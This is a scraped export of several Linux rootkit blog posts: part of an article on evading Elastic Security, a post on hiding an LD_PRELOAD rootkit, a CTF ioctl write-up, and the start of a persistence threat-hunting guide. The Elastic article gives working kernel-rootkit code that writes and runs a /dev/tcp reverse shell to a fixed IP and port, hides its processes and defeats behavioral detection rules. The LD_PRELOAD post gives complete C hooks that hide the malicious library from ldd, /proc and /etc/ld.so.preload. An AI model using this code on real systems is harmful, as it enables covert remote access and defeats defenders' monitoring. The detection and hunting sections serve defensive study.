nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits 